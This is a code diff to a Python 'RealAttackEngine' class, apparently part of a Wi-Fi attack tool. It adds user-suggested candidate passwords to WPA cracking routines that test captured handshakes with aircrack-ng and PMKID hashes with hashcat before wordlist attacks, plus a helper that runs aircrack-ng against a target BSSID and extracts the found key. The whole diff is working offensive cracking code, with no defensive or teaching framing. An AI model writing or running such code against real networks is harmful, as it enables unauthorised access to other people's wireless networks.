@@ -80,7 +80,8 @@ class RealAttackEngine:
             return False
 
     def execute_real_attack(self, target, interface="wlan0mon",
-                             max_duration=3600, seeds=None, wordlist=None):
+                             max_duration=3600, seeds=None, wordlist=None,
+                             user_passwords=None):
         bssid = target.get("bssid", "")
         ssid = target.get("ssid", "?")
         channel = target.get("channel", 1)
@@ -103,6 +104,7 @@ class RealAttackEngine:
             "snr_passed": False,
             "isp_match": None,
             "wordlist_used": wordlist,
+            "user_passwords": user_passwords,
             "errors": [],
         }
 
@@ -260,6 +262,14 @@ class RealAttackEngine:
             result["errors"].append("Handshake setup failed")
             return None, 0
 
+        user_pws = result.get("user_passwords")
+        if user_pws:
+            print(f"   Trying {len(user_pws)} user-suggested passwords...")
+            for pw in user_pws:
+                pw_found = self._test_single_aircrack(bssid, handshake_file, pw)
+                if pw_found:
+                    return pw, 1
+
         wordlist = result.get("wordlist_used")
         if wordlist and os.path.isfile(wordlist):
             print(f"   Trying wordlist: {wordlist}")
@@ -298,6 +308,13 @@ class RealAttackEngine:
 
         gpu = self.hardware_optimizer.detect_gpu() if self.hardware_optimizer else {}
         use_gpu = gpu.get("available", False)
+
+        user_pws = result.get("user_passwords")
+        if user_pws:
+            print(f"   Trying {len(user_pws)} user-suggested passwords...")
+            for pw in user_pws:
+                if self._test_hashcat_single(pmkid_file, pw, use_gpu):
+                    return pw, 1
 
         wordlist = result.get("wordlist_used")
         if wordlist and os.path.isfile(wordlist):
@@ -364,6 +381,26 @@ class RealAttackEngine:
             return None, 0
         except Exception:
             return None, 0
+
+    def _test_single_aircrack(self, bssid, handshake_file, password):
+        try:
+            import tempfile
+            with tempfile.NamedTemporaryFile(mode="w", delete=False,
+                                              suffix=".txt") as f:
+                f.write(password + "\n")
+                f.flush()
+                tmp = f.name
+            r = subprocess.run(
+                ["aircrack-ng", "-b", bssid, "-w", tmp, handshake_file],
+                capture_output=True, text=True, timeout=30,
+            )
+            os.unlink(tmp)
+            if "KEY FOUND" in r.stdout:
+                m = re.search(r"KEY FOUND.*?\[(.*?)\]", r.stdout)
+                return m.group(1) if m else password
+            return None
+        except Exception:
+            return None
 
     def _try_wordlist_hashcat(self, hash_file, wordlist, use_gpu, result):
         try:
